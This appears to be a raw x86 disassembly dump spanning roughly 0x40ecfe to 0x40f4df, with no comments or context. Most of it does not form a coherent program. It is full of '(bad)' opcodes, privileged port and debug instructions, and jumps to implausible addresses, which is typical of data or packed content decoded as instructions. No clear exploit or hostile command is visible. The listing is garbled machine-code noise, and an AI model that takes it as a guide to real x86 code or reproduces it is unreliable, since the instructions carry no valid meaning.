  40ecfe:	mov    eax,0x203e8
  40ed03:	add    al,ah
  40ed05:	inc    esi
  40ed06:	mov    al,ch
  40ed08:	pop    es
  40ed09:	add    DWORD PTR [eax],0x1
  40ed0c:	add    dh,al
  40ed0e:	add    ah,ch
  40ed10:	rol    DWORD PTR [edx-0xd],1
  40ed13:	cli    
  40ed14:	push   0x4a
  40ed16:	pop    ecx
  40ed17:	retf   0xfe6
  40ed1a:	add    BYTE PTR [ebx-0x4e72f41e],al
  40ed20:	(bad)  
  40ed21:	dec    BYTE PTR [ebx+0x45b1fc72]
  40ed27:	(bad)  
  40ed28:	sub    ebp,DWORD PTR [ebx]
  40ed2a:	and    al,0x52
  40ed2c:	(bad)  
  40ed2d:	dec    edi
  40ed2e:	inc    ebp
  40ed2f:	shl    DWORD PTR [eax+0x24fe8c8],0x0
  40ed36:	add    BYTE PTR [ebp-0x7b],dh
  40ed39:	pop    eax
  40ed3a:	add    BYTE PTR [edx+0x0],bl
  40ed3d:	pop    edx
  40ed3e:	dec    ebp
  40ed3f:	jmp    DWORD PTR [ebx]
  40ed41:	and    al,0xec
  40ed43:	push   edx
  40ed44:	out    0x64,eax
  40ed46:	jmp    0xd3f2e34b
  40ed4b:	jmp    0x40eda5
  40ed4d:	mov    al,0xfe
  40ed4f:	dec    BYTE PTR [ebp-0x18fd8018]
  40ed55:	add    BYTE PTR [esi+ebp*1],bh
  40ed58:	pop    edx
  40ed59:	icebp  
  40ed5a:	mov    eax,cs
  40ed5c:	ins    BYTE PTR es:[edi],dx
  40ed5d:	adc    eax,0x75510000
  40ed62:	mov    esi,0x70158
  40ed67:	or     DWORD PTR [eax-0x74f48dfe],esi
  40ed6d:	mov    edi,esp
  40ed6f:	cld    
  40ed70:	jge    0x40ede7
  40ed72:	(bad)  
  40ed74:	aas    
  40ed75:	and    al,0x6d
  40ed77:	adc    cl,0x1
  40ed7a:	mov    eax,DWORD PTR [eax]
  40ed7c:	and    ecx,DWORD PTR [ebx-0x167203fd]
  40ed82:	dec    ebp
  40ed83:	add    eax,ebp
  40ed85:	add    BYTE PTR [edx],al
  40ed87:	fadd   DWORD PTR [eax]
  40ed89:	stc    
  40ed8a:	enter  0xee00,0x8b
  40ed8e:	sbb    eax,0x1
  40ed91:	sbb    esi,ecx
  40ed93:	in     al,0x0
  40ed95:	in     eax,dx
  40ed96:	add    BYTE PTR [eax],al
  40ed98:	jne    0x40ed25
  40ed9a:	cmp    edx,esp
  40ed9c:	jb     0x40eda7
  40ed9e:	jmp    0x40ee15
  40eda0:	mov    ecx,DWORD PTR [ebx+0x4d91d4cc]
  40eda6:	add    BYTE PTR [ebx+0x4d83d840],cl
  40edac:	add    DWORD PTR [ebx+0x4d3bdcee],ecx
  40edb2:	jb     0x40ed3d
  40edb4:	pop    edx
  40edb5:	fadd   QWORD PTR [ebx-0x7445faa1]
  40edbb:	or     dh,BYTE PTR [edx+0x0]
  40edbe:	inc    edx
  40edbf:	or     dl,bh
  40edc1:	xlat   BYTE PTR ds:[ebx]
  40edc2:	dec    edx
  40edc3:	push   edi
  40edc4:	add    al,0x7
  40edc6:	leave  
  40edc7:	rol    DWORD PTR [edx+eax*1],0x7
  40edcb:	add    ecx,ecx
  40edcd:	mov    edx,ecx
  40edcf:	int3   
  40edd0:	jmp    0x40ed90
  40edd2:	mov    al,0x0
  40edd4:	(bad)  
  40edd5:	jne    0x40edbf
  40edd7:	mov    eax,DWORD PTR [edx]
  40edd9:	call   0xc1556ade
  40edde:	pop    edi
  40eddf:	add    ebx,DWORD PTR [ecx-0x37]
  40ede2:	pop    ecx
  40ede3:	or     BYTE PTR [ecx*4-0x1445b8af],dh
  40edea:	push   es
  40edeb:	mov    eax,DWORD PTR [eax]
  40eded:	int3   
  40edee:	add    ch,al
  40edf0:	jae    0x40edda
  40edf2:	int    0x1
  40edf4:	enter  0x3000,0x18
  40edf8:	add    BYTE PTR [ebp+0x75],al
  40edfb:	mov    esi,DWORD PTR [eax-0x171f0134]
  40ee01:	push   0x2
  40ee03:	pop    ecx
  40ee04:	add    BYTE PTR [eax],cl
  40ee06:	push   ebx
  40ee07:	lea    edi,[edi+eax*2]
  40ee0a:	mov    al,0x1
  40ee0c:	jb     0x40ee0e
  40ee0e:	mov    al,0x10
  40ee10:	push   eax
  40ee11:	add    al,0x75
  40ee13:	add    BYTE PTR [ebx],ch
  40ee15:	add    ebx,esp
  40ee17:	int3   
  40ee18:	jne    0x40ee2a
  40ee1a:	movsx  edx,cl
  40ee1d:	add    DWORD PTR [eax],eax
  40ee1f:	add    BYTE PTR [ebp+ecx*2+0x40aa2b7d],ch
  40ee26:	mov    gs,edi
  40ee28:	add    BYTE PTR [eax-0x50],ch
  40ee2b:	add    al,ch
  40ee2d:	mov    eax,DWORD PTR [ecx]
  40ee2f:	sub    eax,DWORD PTR [eax]
  40ee31:	jb     0x40eea8
  40ee33:	add    DWORD PTR [esp+eiz*8-0x50],esi
  40ee37:	jge    0x40ee21
  40ee39:	add    al,0x1
  40ee3b:	add    DWORD PTR [eax],0x0
  40ee3e:	jne    0x40ee40
  40ee40:	je     0x40ee87
  40ee42:	mov    eax,DWORD PTR [edi]
  40ee44:	ror    BYTE PTR [ebp+0x4d],1
  40ee47:	or     DWORD PTR [ecx+0x4d03d004],0x3
  40ee4e:	mov    DWORD PTR [ebx-0x1eb2372c],ecx
  40ee54:	mov    DWORD PTR [ebx],ebp
  40ee56:	fadd   DWORD PTR [eax+0x75]
  40ee59:	inc    eax
  40ee5a:	pop    eax
  40ee5b:	lea    ebx,[ecx+0x4f]
  40ee5e:	push   0xb1000003
  40ee63:	out    dx,eax
  40ee64:	add    ebp,DWORD PTR [edx+edx*2]
  40ee67:	add    BYTE PTR [ebx+ecx*4],bh
  40ee6a:	mov    ch,BYTE PTR [ebx]
  40ee6c:	jb     0x40eee0
  40ee6e:	add    al,0x89
  40ee70:	push   eax
  40ee71:	call   0x84293be3
  40ee76:	add    DWORD PTR [eax+eax*1],eax
  40ee79:	jae    0x40ee8f
  40ee7b:	icebp  
  40ee7c:	inc    ebp
  40ee7d:	mov    eax,DWORD PTR gs:[ecx]
  40ee80:	int3   
  40ee81:	out    dx,al
  40ee82:	loopne 0x40eed1
  40ee84:	sub    eax,DWORD PTR [edx]
  40ee86:	push   0xffffff83
  40ee88:	pop    esi
  40ee89:	push   cs
  40ee8a:	jl     0x40eea5
  40ee8c:	add    al,0xaf
  40ee8e:	xor    eax,0x832b6d00
  40ee93:	mov    eax,DWORD PTR [edx]
  40ee95:	rcr    BYTE PTR [ebp+0x754500dc],cl
  40ee9b:	ror    DWORD PTR [ebx+0x7dc8e803],1
  40eea1:	inc    ebp
  40eea2:	shr    ebx,0x3
  40eea5:	or     DWORD PTR [eax],0x4
  40eea8:	push   0xffffffa5
  40eeaa:	pop    esi
  40eeab:	add    BYTE PTR [ecx+edx*8-0x23ff2efc],bh
  40eeb2:	jmp    0x40ef11
  40eeb4:	mov    edi,0xff0272
  40eeb9:	fdivr  QWORD PTR [ebp+0x5d]
  40eebc:	push   0x4e
  40eebe:	pop    ecx
  40eebf:	call   0x4132c4
  40eec4:	mov    DWORD PTR [ebx],eax
  40eec6:	in     al,0xc8
  40eec8:	rol    BYTE PTR [ebp-0x75],0xc1
  40eecc:	call   0xaaf0ad
  40eed1:	pop    esi
  40eed2:	enter  0xceff,0x8b
  40eed6:	repz mov ecx,DWORD PTR [ebp-0x34]
  40eeda:	xor    DWORD PTR [esi-0x57f0ff3c],0xffffffb0
  40eee1:	je     0x40eee3
  40eee3:	or     DWORD PTR [ebx-0x74183b24],eax
  40eee9:	jne    0x40eecf
  40eeeb:	jmp    0x40eee6
  40eeed:	push   DWORD PTR [edx-0x24]
  40eef0:	push   0x4d
  40eef2:	pop    ecx
  40eef3:	cmp    DWORD PTR [ebp+0x2],0xffffffc1
  40eef7:	jge    0x40eeff
  40eef9:	mov    eax,eax
  40eefb:	sub    ebp,DWORD PTR [edx+0x24]
  40eefe:	pop    esi
  40eeff:	inc    ebp
  40ef00:	mov    esp,0x8b6077
  40ef05:	sub    ecx,DWORD PTR [ebx+0x155e8dc]
  40ef0b:	lods   al,BYTE PTR ds:[esi]
  40ef0c:	add    BYTE PTR [ebx],bh
  40ef0e:	enter  0xce73,0x49
  40ef12:	repz test DWORD PTR [ebp+0x7d],0xf0dc0f89
  40ef1a:	stc    
  40ef1b:	jge    0x40ef8f
  40ef1d:	jnp    0xdd40727e
  40ef23:	call   0xc3eff9
  40ef28:	fadd   st(0),st
  40ef2a:	dec    esi
  40ef2b:	ins    BYTE PTR es:[edi],dx
  40ef2c:	stc    
  40ef2d:	cmp    al,0x73
  40ef2f:	push   ebp
  40ef30:	mov    eax,0xf8028b
  40ef35:	jne    0x40eef8
  40ef37:	mov    esi,ecx
  40ef39:	mov    esp,DWORD PTR [ebp+0x2c]
  40ef3c:	add    edi,DWORD PTR [ebp-0x24]
  40ef3f:	sub    esp,eax
  40ef41:	and    al,0x45
  40ef43:	cmp    cl,BYTE PTR [ecx+0x2d5fcc5b]
  40ef49:	sbb    al,0xee
  40ef4b:	pop    esi
  40ef4c:	call   0x80ef7c
  40ef51:	fsubr  st,st(3)
  40ef53:	sti    
  40ef54:	add    BYTE PTR gs:[ecx],bh
  40ef57:	add    eax,esp
  40ef59:	add    DWORD PTR [esi],eax
  40ef5b:	rol    DWORD PTR [ebp+0x8],0x29
  40ef5f:	mov    esp,eax
  40ef61:	clc    
  40ef62:	jne    0x40efd9
  40ef64:	mov    eax,0x8b0673
  40ef69:	loopne 0x40efb0
  40ef6b:	loopne 0x40eef6
  40ef6d:	lods   al,BYTE PTR ds:[esi]
  40ef6e:	int3   
  40ef6f:	inc    ebp
  40ef70:	mov    DWORD PTR gs:[eax+edi*8],eax
  40ef74:	add    al,0xc3
  40ef76:	sub    ecx,DWORD PTR [ebp+0x47]
  40ef79:	(bad)  
  40ef7b:	shr    BYTE PTR [ebp-0x1f],0xe8
  40ef7f:	add    eax,DWORD PTR [eax]
  40ef81:	call   0x642b086
  40ef86:	add    esi,DWORD PTR [esi-0x3b2efc83]
  40ef8c:	dec    esi
  40ef8d:	ins    DWORD PTR es:[edi],dx
  40ef8e:	in     al,dx
  40ef8f:	lea    eax,[eax]
  40ef91:	inc    ebp
  40ef92:	inc    ebp
  40ef93:	sub    ecx,DWORD PTR [ebx-0x3eba1b73]
  40ef99:	or     DWORD PTR [ebx-0x38ff0400],0x398b4573
  40efa3:	and    al,0xdc
  40efa5:	ror    DWORD PTR [edx+0x24],0xf7
  40efa9:	or     BYTE PTR [ebp+0x4c],dh
  40efac:	mov    ebx,DWORD PTR [eax+ebp*1-0x64]
  40efb0:	stos   BYTE PTR es:[edi],al
  40efb1:	adc    edx,edi
  40efb3:	inc    esp
  40efb4:	add    edi,DWORD PTR [eax]
  40efb6:	jne    0x40ef9b
  40efb8:	mov    DWORD PTR [eax-0x7449db04],ecx
  40efbe:	cmp    ecx,DWORD PTR [edi]
  40efc0:	sub    BYTE PTR [ebp-0x7e],dl
  40efc3:	sar    ebp,0xb
  40efc6:	jmp    FWORD PTR [edi+0x2400392a]
  40efcc:	sub    esi,DWORD PTR [ebx-0x73]
  40efcf:	mov    esp,DWORD PTR [ecx+edi*4]
  40efd2:	mov    ecx,DWORD PTR [eax]
  40efd4:	and    BYTE PTR [eax],al
  40efd6:	jne    0x40efa2
  40efd8:	sub    ebp,ecx
  40efda:	sbb    BYTE PTR [esi+0x32],ah
  40efdd:	dec    ebp
  40efde:	push   ebp
  40efdf:	add    ecx,DWORD PTR [ebx+0x7d24fc8d]
  40efe5:	ret    
  40efe6:	mov    edx,ebp
  40efe8:	leave  
  40efe9:	sub    DWORD PTR [esi+0x24],ebx
  40efec:	ret    0x2b
  40efef:	pop    ax
  40eff1:	push   ebp
  40eff2:	rol    BYTE PTR [ebx],0xeb
  40eff5:	add    DWORD PTR [ecx+0x6c0001],0x40
  40effc:	jb     0x40f053
  40effe:	ret    
  40efff:	in     al,dx
  40f000:	jecxz  0x40ef8d
  40f002:	push   esi
  40f003:	xchg   esp,eax
  40f004:	jne    0x40f006
  40f006:	cmp    edx,DWORD PTR [esi+0x1c]
  40f009:	jne    0x40efef
  40f00b:	mov    eax,DWORD PTR [ebp-0x77]
  40f00e:	ror    DWORD PTR [ebx+0x899408],0xe0
  40f015:	mov    esi,DWORD PTR [ebp-0x75]
  40f018:	pop    esi
  40f019:	nop
  40f01a:	mov    eax,DWORD PTR [eax]
  40f01c:	les    ecx,FWORD PTR [ecx-0x6b3e744a]
  40f022:	add    al,0x0
  40f024:	inc    ebp
  40f025:	mov    eax,DWORD PTR [ebx]
  40f027:	mov    ebp,ebx
  40f029:	cmp    al,0xf
  40f02b:	or     al,al
  40f02d:	inc    ebp
  40f02e:	inc    ebp
  40f02f:	xor    DWORD PTR [ebx+0x6c8bc89c],ecx
  40f035:	cld    
  40f036:	add    BYTE PTR [edi+0x546c16c0],dh
  40f03c:	add    BYTE PTR [ecx-0x5],dl
  40f03f:	add    eax,0x17200
  40f044:	sbb    al,0x85
  40f046:	dec    esp
  40f047:	je     0x40f081
  40f049:	mov    esp,DWORD PTR [eax+ecx*8+0x20]
  40f04d:	add    BYTE PTR [ebx],bh
  40f04f:	(bad)  
  40f050:	and    al,0x32
  40f052:	jae    0x40eff0
  40f054:	mov    cl,cl
  40f056:	inc    DWORD PTR [esp]
  40f059:	push   ebp
  40f05a:	shr    esp,0x8
  40f05d:	in     al,dx
  40f05e:	push   esp
  40f05f:	add    DWORD PTR [eax],esp
  40f061:	add    bl,cl
  40f063:	inc    ebp
  40f064:	mov    bh,0x53
  40f066:	add    BYTE PTR [ebp-0x17],al
  40f069:	push   esi
  40f06a:	cmovne ecx,edx
  40f06d:	xor    cl,BYTE PTR [esp+ebx*4+0x20]
  40f071:	push   edi
  40f072:	pop    ss
  40f073:	xor    ecx,ebx
  40f075:	pushf  
  40f076:	add    BYTE PTR [ecx+0x452bf800],cl
  40f07c:	rcr    ecx,0x5
  40f07f:	inc    ebp
  40f080:	add    edx,ebx
  40f082:	add    BYTE PTR [ebp-0x40],al
  40f085:	out    0x6c,eax
  40f087:	inc    ebp
  40f088:	inc    eax
  40f089:	sub    eax,0x450546c1
  40f08e:	dec    esp
  40f08f:	sub    al,0x20
  40f091:	inc    ebp
  40f092:	fnstcw WORD PTR [esi+0x29]
  40f095:	leave  
  40f096:	add    BYTE PTR [esi+0xc000c0],bh
  40f09c:	lea    eax,[esp-0x40]
  40f0a0:	ret    
  40f0a1:	mov    dh,0x8b
  40f0a3:	xor    edx,DWORD PTR [ecx+0x3]
  40f0a6:	mov    al,BYTE PTR [ecx+0x1]
  40f0a9:	sbb    BYTE PTR [eax],al
  40f0ab:	stc    
  40f0ac:	mov    esi,DWORD PTR [edx+0x8]
  40f0af:	(bad)  
  40f0b0:	ss mov eax,0xb98ac631
  40f0b6:	add    esi,eax
  40f0b8:	add    BYTE PTR [edx-0x444d39f7],bh
  40f0be:	add    esi,eax
  40f0c0:	add    BYTE PTR [esi+ecx*1+0x1bd82c6],bh
  40f0c7:	mov    BYTE PTR [eax],0xbe
  40f0ca:	or     BYTE PTR [ebx],dh
  40f0cc:	dec    ecx
  40f0cd:	lea    eax,[ebx]
  40f0cf:	or     eax,0x18fc0fc7
  40f0d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f0d5:	(bad)  
  40f0d7:	fiadd  WORD PTR [ebp-0x78]
  40f0da:	jae    0xed75f829
  40f0e0:	or     BYTE PTR [ebp+0x7],al
  40f0e3:	in     eax,dx
  40f0e4:	fwait
  40f0e5:	inc    ebp
  40f0e6:	xor    ah,dh
  40f0e8:	pop    esi
  40f0e9:	inc    ebp
  40f0ea:	shl    edx,0xc
  40f0ed:	inc    ebp
  40f0ee:	sub    cl,0x1
  40f0f1:	inc    ebp
  40f0f2:	add    bh,bl
  40f0f4:	add    BYTE PTR [ebp-0x7b],al
  40f0f7:	out    dx,al
  40f0f8:	clc    
  40f0f9:	inc    ebp
  40f0fa:	ret    0xe7
  40f0fd:	inc    ebp
  40f0fe:	mov    edi,DWORD PTR [esi-0x7f]
  40f101:	leave  
  40f102:	and    al,0x44
  40f104:	add    BYTE PTR [eax+0x331cb68b],dh
  40f10a:	mov    DWORD PTR [ebx],eax
  40f10c:	sbb    al,0x41
  40f10e:	(bad)  
  40f10f:	sbb    al,ah
  40f111:	stc    
  40f112:	test   DWORD PTR [edx-0x8],esi
  40f115:	lea    edi,[edi-0x7007a98]
  40f11b:	mov    DWORD PTR [ebp-0x2c],edi
  40f11e:	(bad)  
  40f11f:	dec    ebp
  40f120:	sar    BYTE PTR [eax+0x71c1fcc6],0xc6
  40f127:	add    edx,eax
  40f129:	(bad)  
  40f12a:	(bad)  
  40f12b:	inc    ebx
  40f12d:	jmp    FWORD PTR [edx-0x38]
  40f130:	(bad)  
  40f131:	or     al,ah
  40f133:	jge    0x40f0fb
  40f135:	mov    ebp,0x5a8533e4
  40f13b:	clc    
  40f13c:	enter  0x45,0x8b
  40f140:	lea    ecx,[ebp+ecx*1+0x18330f00]
  40f147:	mov    edi,0x7de08da
  40f14c:	mov    BYTE PTR [ebx+0x39063283],bl
  40f152:	in     eax,dx
  40f153:	cmovne edx,ebx
  40f156:	jmp    0x40f158
  40f158:	inc    ebp
  40f159:	mov    ebp,ebp
  40f15b:	sbb    al,0x45
  40f15d:	mov    ebx,ebx
  40f15f:	add    DWORD PTR [ebp+0x0],eax
  40f162:	in     al,dx
  40f163:	add    DWORD PTR [ebp+0x4d],eax
  40f166:	sub    eax,0x2c80458b
  40f16b:	add    BYTE PTR [ebp-0x77],al
  40f16e:	jle    0x40f1da
  40f170:	leave  
  40f171:	mov    DWORD PTR [esp+ecx*8-0x48],0x33e9b6e6
  40f179:	inc    ebp
  40f17a:	add    ebx,edi
  40f17c:	inc    ecx
  40f17d:	out    0x18,eax
  40f17f:	(bad)  
  40f180:	stc    
  40f181:	int3   
  40f182:	jb     0x40f10e
  40f184:	(bad)  
  40f185:	xor    dh,BYTE PTR [eax-0x4ec73980]
  40f18b:	or     dh,al
  40f18d:	dec    esi
  40f18e:	mov    dl,0xf3
  40f190:	mov    BYTE PTR [ebp-0x4d],0x89
  40f194:	(bad)  
  40f195:	loopne 0x40f14b
  40f197:	inc    esi
  40f199:	lea    esi,[ebp-0x49003924]
  40f19f:	push   eax
  40f1a0:	mov    BYTE PTR [ebp-0x49],0x33
  40f1a4:	xor    eax,DWORD PTR [ebx]
  40f1a6:	lea    edx,[eax+0xd]
  40f1a9:	inc    ebp
  40f1aa:	jae    0x8c1b57c8
  40f1b0:	ficomp WORD PTR [eax+ecx*4]
  40f1b3:	add    BYTE PTR [ebx-0x12fff7ff],0x85
  40f1ba:	test   esi,edi
  40f1bc:	(bad)  
  40f1bd:	(bad)  
  40f1be:	inc    DWORD PTR [eax]
  40f1c0:	inc    ebp
  40f1c1:	add    BYTE PTR [ebx-0x10aa2bd0],cl
  40f1c7:	test   DWORD PTR [ebx],edx
  40f1c9:	jne    0x40f154
  40f1cb:	or     DWORD PTR [ebx-0xed9771],0x75703b8e
  40f1d5:	jmp    0x124f263
  40f1da:	inc    ebp
  40f1db:	jne    0x40f1c9
  40f1dd:	mov    DWORD PTR [eax+eiz*8+0x331cff8b],ebx
  40f1e4:	mov    BYTE PTR [ebp+0x45009c01],cl
  40f1ea:	shl    BYTE PTR [eax],0x54
  40f1ed:	push   cx
  40f1ef:	mov    bx,0x7245
  40f1f3:	gs add bh,al
  40f1f6:	add    DWORD PTR [ebp+eax*4+0xe601df],ebx
  40f1fd:	inc    ebp
  40f1fe:	dec    ebp
  40f1ff:	int3   
  40f200:	mov    esp,ebx
  40f202:	jl     0x40f1cb
  40f204:	add    BYTE PTR [ecx+ecx*4+0x1ce28bdb],ah
  40f20b:	inc    ebp
  40f20c:	mov    edi,ebx
  40f20e:	add    ebp,esp
  40f210:	add    BYTE PTR [esi+0x1],ah
  40f213:	inc    ebp
  40f214:	or     BYTE PTR [edi],bh
  40f216:	inc    ebp
  40f217:	(bad)  
  40f218:	in     eax,dx
  40f219:	fsubr  st(2),st
  40f21b:	inc    edi
  40f21d:	add    dl,al
  40f21f:	add    dh,ch
  40f221:	call   0x860aa4
  40f226:	pop    esi
  40f227:	test   DWORD PTR [eax],ecx
  40f229:	dec    dl
  40f22b:	(bad)  
  40f22c:	jmp    0x413f7ab6
  40f231:	push   DWORD PTR [ebp-0x75]
  40f234:	(bad)  
  40f235:	loopne 0x40f203
  40f237:	mov    DWORD PTR [ebp-0x74013d],0xfec0851c
  40f241:	push   eax
  40f242:	inc    DWORD PTR [ebp-0x75]
  40f245:	mov    esp,eax
  40f247:	cwde   
  40f248:	mov    DWORD PTR [eax],0xff8bffc3
  40f24e:	sbb    al,0x8
  40f250:	ror    BYTE PTR [ebp+0x50],0x51
  40f254:	inc    ebp
  40f255:	ror    BYTE PTR [ebx+0x65987d],1
  40f25b:	test   edi,eax
  40f25d:	add    al,0xdc
  40f25f:	add    bh,bh
  40f261:	push   0x1
  40f263:	add    BYTE PTR [eax],al
  40f265:	mov    edi,edi
  40f267:	inc    WORD PTR [ebp+0x8]
  40f26b:	add    eax,0xd
  40f26e:	(bad)  
  40f270:	xor    eax,0x782ec89
  40f275:	push   ecx
  40f276:	cli    
  40f277:	popw   es
  40f279:	push   ebp
  40f27a:	xchg   BYTE PTR [ebx-0x76740800],al
  40f280:	sbb    al,0x86
  40f282:	test   DWORD PTR [ecx-0x2],edx
  40f285:	call   WORD PTR [ebp-0x40]
  40f289:	adc    DWORD PTR [ebp-0x5],0xffffffc7
  40f28d:	mov    eax,ebx
  40f28f:	mov    dh,BYTE PTR ds:0xc7666851
  40f295:	push   ebp
  40f296:	fsub   QWORD PTR [esi+0x0]
  40f299:	dec    ebp
  40f29a:	inc    ebp
  40f29b:	mov    edx,0xea4ece
  40f2a0:	(bad)  
  40f2a1:	retf   0x89a0
  40f2a4:	fist   DWORD PTR [eax+0x454ae1]
  40f2aa:	call   0xc7a72f3a
  40f2af:	mov    ch,0xa8
  40f2b1:	jmp    eax
  40f2b3:	(bad)  
  40f2b4:	in     eax,dx
  40f2b5:	lock (bad) 
  40f2b7:	mov    DWORD PTR [esi+ebp*2-0x727a0082],ebp
  40f2be:	(bad)  
  40f2bf:	xor    eax,0x700089ff
  40f2c4:	add    bh,bh
  40f2c6:	stos   DWORD PTR es:[edi],eax
  40f2c7:	data16 add BYTE PTR [ebp-0x1b0077],al
  40f2ce:	inc    DWORD PTR [ecx-0x73]
  40f2d1:	data16 fadd QWORD PTR [ebp-0xaf0001]
  40f2d8:	inc    ebp
  40f2d9:	shl    BYTE PTR [ebx],0x66
  40f2dc:	add    eax,DWORD PTR [ebp-0xba00b0]
  40f2e2:	add    DWORD PTR [ecx+0x44],0x66
  40f2e6:	mov    eax,DWORD PTR [ebp-0x7f00e4]
  40f2ec:	add    DWORD PTR [ecx-0xcf8600],ecx
  40f2f2:	push   ebp
  40f2f3:	lea    dx,[ebp-0x28]
  40f2fa:	add    BYTE PTR [ebp-0x25],0xf
  40f2fe:	jge    0xff41f205
  40f304:	mov    ecx,0xc34fc7
  40f309:	rol    ecx,0x89
  40f30c:	mov    DWORD PTR [eax+eax*4-0x1],ebp
  40f310:	ror    BYTE PTR [ebx-0x48990775],0x55
  40f317:	or     BYTE PTR [ebp-0x763c0a39],0xc1
  40f31e:	test   BYTE PTR [ecx-0x3f997f3e],cl
  40f324:	push   ebp
  40f325:	mov    DWORD PTR [ebp-0x76761880],ecx
  40f32b:	or     BYTE PTR [eax+0x6600c265],0x45
  40f332:	push   ebp
  40f333:	xor    DWORD PTR [ebp-0x76381e64],ecx
  40f339:	aam    0x8c
  40f33b:	test   DWORD PTR [ecx-0x3dba7108],ecx
  40f341:	cmp    eax,0xc78b9c00
  40f346:	data16 hlt 
  40f348:	dec    ebp
  40f349:	test   DWORD PTR [ecx+0x454ff8],edi
  40f34f:	xor    ecx,esi
  40f351:	lahf   
  40f352:	mov    DWORD PTR [ebx-0x7f00e394],ecx
  40f358:	mov    eax,DWORD PTR [ecx]
  40f35a:	data16 add BYTE PTR [ebp-0x7400bb],dh
  40f361:	sbb    al,0x71
  40f363:	dec    ebp
  40f364:	mov    si,WORD PTR [ebp-0xff0074]
  40f36b:	mov    ecx,DWORD PTR [ecx-0x6f8d75]
  40f371:	add    BYTE PTR [ebp-0x760fd877],cl
  40f377:	jne    0x40f3ed
  40f379:	test   edi,edi
  40f37b:	jne    0x40f300
  40f37d:	(bad)  
  40f37e:	sti    
  40f37f:	sbb    BYTE PTR [ecx-0x1789ab],cl
  40f385:	cld    
  40f386:	(bad)  
  40f387:	jmp    DWORD PTR [ecx]
  40f389:	inc    ebp
  40f38a:	mov    DWORD PTR [ebx+0x3ff8b78],ecx
  40f390:	data16 cmp al,0x8d
  40f393:	push   cs
  40f394:	inc    DWORD PTR [ebp-0x1]
  40f397:	test   DWORD PTR [ecx-0x838c],ecx
  40f39d:	sbb    al,0x8b
  40f39f:	lock clc 
  40f3a1:	push   DWORD PTR [edi-0xe39375]
  40f3a7:	xor    BYTE PTR [ebx],0x1
  40f3aa:	add    eax,DWORD PTR [eax]
  40f3ac:	xor    eax,DWORD PTR [eax]
  40f3ae:	mov    WORD PTR [ebp-0xba003d],0x4575
  40f3b7:	mov    ecx,DWORD PTR [edi]
  40f3b9:	sbb    al,0x4d
  40f3bb:	mov    DWORD PTR [ebx],esi
  40f3bd:	add    DWORD PTR [ebx],eax
  40f3bf:	add    BYTE PTR [ebx],dh
  40f3c1:	xor    DWORD PTR [esi-0x80],esp
  40f3c4:	inc    ebp
  40f3c5:	add    DWORD PTR [ebx],esi
  40f3c7:	add    BYTE PTR [esi+0x50],ah
  40f3ca:	inc    ebp
  40f3cb:	jmp    0x85f636
  40f3d0:	add    DWORD PTR [eax+0xc70194],0xffffffec
  40f3d7:	or     BYTE PTR [ebp+0x4501f845],dh
  40f3dd:	jmp    0xdcf6d3
  40f3e2:	(bad)  
  40f3e3:	push   cs
  40f3e4:	in     al,0xc9
  40f3e6:	test   DWORD PTR [ebp+0x4502f8],eax
  40f3ec:	xor    ecx,DWORD PTR [ebp-0x64]
  40f3ef:	mov    eax,edi
  40f3f1:	mov    esp,esp
  40f3f3:	push   eax
  40f3f4:	add    eax,0x45fff885
  40f3f9:	dec    DWORD PTR [ebx+0x339445]
  40f3ff:	add    ecx,DWORD PTR [ecx+0x452ce889]
  40f405:	dec    DWORD PTR [ebx-0x4e0be375]
  40f40b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f40c:	add    edi,edi
  40f40e:	add    bh,bh
  40f410:	push   cs
  40f411:	xor    eax,DWORD PTR [eax+0x890103]
  40f417:	xor    BYTE PTR [ebp-0x1],al
  40f41a:	mov    DWORD PTR [ebp-0x36df38],ecx
  40f420:	push   cs
  40f421:	push   eax
  40f422:	jne    0x40f469
  40f424:	mov    esi,DWORD PTR [ebx]
  40f426:	sbb    al,0x3
  40f428:	jne    0x40f47a
  40f42a:	inc    DWORD PTR [ebp-0x75]
  40f42d:	add    eax,0x800f0
  40f432:	add    BYTE PTR [ebx-0x7f74e3bf],cl
  40f438:	mov    DWORD PTR [ecx],eax
  40f43a:	sbb    BYTE PTR [eax],al
  40f43c:	leave  
  40f43d:	test   DWORD PTR [edi-0x1],eax
  40f440:	jne    0x40f441
  40f442:	call   0xff41df47
  40f447:	xor    BYTE PTR [ebp+0x4d],al
  40f44a:	mov    edi,edi
  40f44c:	enter  0x8,0x4d
  40f450:	mov    ecx,DWORD PTR [ebx-0x17fc74cd]
  40f456:	mov    eax,DWORD PTR [eax]
  40f458:	sbb    al,0x1
  40f45a:	sbb    DWORD PTR [ebp+0x4d],eax
  40f45d:	mov    DWORD PTR [ebx+0x18cc8b],ecx
  40f463:	inc    eax
  40f464:	dec    DWORD PTR [ecx-0x27d775]
  40f46a:	add    BYTE PTR [ebx-0x38d72b01],cl
  40f470:	xchg   ecx,eax
  40f471:	ret    
  40f472:	add    BYTE PTR [ebp-0x830075],al
  40f478:	add    BYTE PTR [ebp-0x75],al
  40f47b:	mov    DWORD PTR [ebp+0x8ff0430],ecx
  40f481:	lea    edi,[edi+0x20]
  40f484:	add    bh,bh
  40f486:	mov    edx,DWORD PTR [eax-0x7b]
  40f489:	inc    ebp
  40f48a:	rdpmc  
  40f48c:	jne    0x40f491
  40f48e:	add    BYTE PTR [eax-0x75],dl
  40f491:	inc    ebp
  40f492:	call   0x4040fd9c
  40f497:	add    BYTE PTR [ecx-0xe3d775],cl
  40f49d:	or     BYTE PTR [ebx-0x38ff13ff],0x85
  40f4a4:	ret    
  40f4a5:	inc    DWORD PTR [ebp-0xff0001]
  40f4ab:	add    BYTE PTR [ebp-0x4b],al
  40f4ae:	cmp    edi,0x24
  40f4b1:	(bad)  
  40f4b2:	push   DWORD PTR [eax]
  40f4b4:	add    BYTE PTR [ebp-0x39],dl
  40f4b7:	test   ebx,eax
  40f4b9:	je     0x40f440
  40f4bb:	mov    edi,edi
  40f4bd:	sbb    bh,bh
  40f4bf:	test   DWORD PTR gs:[eax],eax
  40f4c2:	(bad)  
  40f4c3:	js     0x40f4c4
  40f4c5:	add    BYTE PTR [ebx-0x38b21fdd],cl
  40f4cb:	sub    eax,ebx
  40f4cd:	mov    ecx,DWORD PTR [ebx-0x5513e377]
  40f4d3:	add    eax,DWORD PTR [eax]
  40f4d5:	dec    ebp
  40f4d6:	push   eax
  40f4d7:	mov    al,BYTE PTR [ebp+0x1]
  40f4da:	mov    eax,DWORD PTR [ebp-0x68]
  40f4dd:	mov    eax,DWORD PTR [eax]
  40f4df:	cld    
